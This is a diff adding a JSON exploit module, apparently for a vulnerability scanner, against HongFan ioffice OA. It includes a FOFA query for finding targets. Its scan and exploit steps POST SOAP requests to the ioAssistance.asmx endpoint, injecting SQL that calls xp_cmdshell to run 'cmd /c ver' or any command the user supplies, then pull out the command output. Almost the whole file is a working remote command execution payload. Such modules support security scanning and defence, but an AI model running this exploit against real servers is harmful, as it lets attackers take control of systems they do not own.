@@ -1,0 +1,98 @@
+{
+  "Name": "HongFan ioffice OA RCE",
+  "Description": "HongFan ioffice OA has remote command execution vulnerabilities, causing attackers to gain server permissions.",
+  "Product": "ioffice",
+  "Homepage": "http://www.ioffice.cn/",
+  "DisclosureDate": "2021-03-14",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"ioffice\"",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "whoami"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soap:Body>\r\n    <GetLoginedEmpNoReadedInf xmlns=\"http://tempuri.org/\">\r\n      <sql>exec master.dbo.xp_cmdshell 'cmd /c ver'</sql>\r\n    </GetLoginedEmpNoReadedInf>\r\n  </soap:Body>\r\n</soap:Envelope>",
+        "data_type": "text",
+        "follow_redirect": true,
+        "header": {
+          "Content-Type": "text/xml; charset=utf-8",
+          "SOAPAction": "\"http://tempuri.org/GetLoginedEmpNoReadedInf\""
+        },
+        "method": "POST",
+        "uri": "/ioffice/prg/set/wss/ioAssistance.asmx"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "<output>",
+            "variable": "$body"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "Windows",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soap:Body>\r\n    <GetLoginedEmpNoReadedInf xmlns=\"http://tempuri.org/\">\r\n      <sql>exec master.dbo.xp_cmdshell 'cmd /c {{{cmd}}}'</sql>\r\n    </GetLoginedEmpNoReadedInf>\r\n  </soap:Body>\r\n</soap:Envelope>",
+        "data_type": "text",
+        "follow_redirect": true,
+        "header": {
+          "Content-Type": "text/xml; charset=utf-8",
+          "SOAPAction": "\"http://tempuri.org/GetLoginedEmpNoReadedInf\""
+        },
+        "method": "POST",
+        "uri": "/ioffice/prg/set/wss/ioAssistance.asmx"
+      },
+      "SetVariable": ["output|lastbody|regex|(?s)<output>(.*)</output>"]
+    }
+  ],
+  "Tags": ["rce"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["ioffice"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  },
+  "Disable": true
+}
